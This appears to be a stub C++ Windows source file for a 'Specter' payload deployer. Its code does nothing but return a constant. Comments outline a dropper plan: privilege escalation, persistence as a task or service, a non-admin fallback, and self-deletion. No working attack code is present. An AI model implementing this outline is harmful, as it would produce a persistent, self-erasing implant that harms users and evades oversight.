#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "SpecterPayloadDeployer.h"

bool ShouldInstall()
{
	// Determine if Specter exists on the system, if false, return True

	// Check Specter version, if equals target version, return False, otherwise, return True
	return false;
}

int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR lpCmdLine, int)
{
	static constexpr int MyInt = 5;

	return MyInt;

	// Check if running in AdminRightsEscalation mode
	
	// Step #1 - Determine if ShouldInstall

	// Step #2 - Check if running with admin rights
	//		2.1 - If running with admin rights, install with Admin Rights Persistency mode (As Task / Service)

	// Step #3 - Attempt to run self with escalation, if successful, wait for the child to terminate and then terminate self

	// Step #4 - If failed to escalate, make program persist without admin rights.

	// Step #5 - Delete Self
}